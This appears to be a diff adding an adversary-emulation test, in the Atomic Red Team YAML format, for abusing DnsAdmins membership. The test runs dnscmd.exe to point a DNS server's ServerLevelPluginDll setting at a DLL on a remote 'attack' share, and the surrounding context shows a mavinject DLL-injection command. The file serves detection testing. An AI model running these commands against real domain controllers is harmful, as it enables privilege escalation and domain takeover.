@@ -34,3 +34,51 @@ atomic_tests:
       mavinject $mypid /INJECTRUNNING #{dll_payload}
     name: powershell
     elevation_required: true
+- name: DnsAdmins exploitation (DnsCmd)
+  auto_generated_guid: 3a3e2dfe-9122-4370-8f61-44e1f26c1f7b
+  description: |
+    This module runs the Microsoft tool DnsCmd in order to install a malicious DLL onto a DNS server (this service is usually carried by a Domain Controller).
+    DnsCmd is available either with the Remote Server Administration Tools (https://www.microsoft.com/en-US/download/details.aspx?id=45520) or in "Features on Demand" since Windows 10.
+    Computer must be domain-joined and running with an account that is a member of some specific group (DnsAdmins is expected for the exact exploitation, but this can also work as a Domain Admins).
+    Remark: there is no need for a proper DLL path for triggering the detection. I.e. the registry of the remote server (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`) will be updated with this path, whether or not it is valid. But for real exploitation, the DLL has to follow some conditions and the network path needs to be reachable.
+  supported_platforms:
+  - windows
+  input_arguments:
+    target_dns:
+      description: DNS server to target
+      type: string
+      default: DNS.DOMAIN.CORP
+    dll_path:
+      description: Path to the DLL that the DNS server will attempt to load
+      type: string
+      default: \\AttackWks\share\attack.dll
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      DnsCmd binary must be installed and present on disk.
+      The computer must be domain-joined and the authenticated user must be part of the DnsAdmins or Domain Admins group (implicit authentication).
+    prereq_command: |
+      if (Test-Path "C:\Windows\System32\dnscmd.exe") {
+        Write-Host "OK: DnsCmd executable was found"
+      } else {
+        Write-Host "NOK: DnsCmd executable was not found"
+        exit 1
+      }
+
+      if ((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {
+        Write-Host "OK: the computer is joined to a domain"
+      } else {
+        Write-Host "NOK: the computer is not joined to a domain"
+        exit 1
+      }
+
+      # If everything goes well
+      exit 0
+    get_prereq_command: |
+      Write-Host "1. This computer must be manually joined to a domain"
+      Write-Host "2. The binary of DnsCmd must be present on the system (through RSAT or Features on Demand)"
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      dnscmd.exe "#{target_dns}" /config /ServerLevelPluginDll "#{dll_path}"
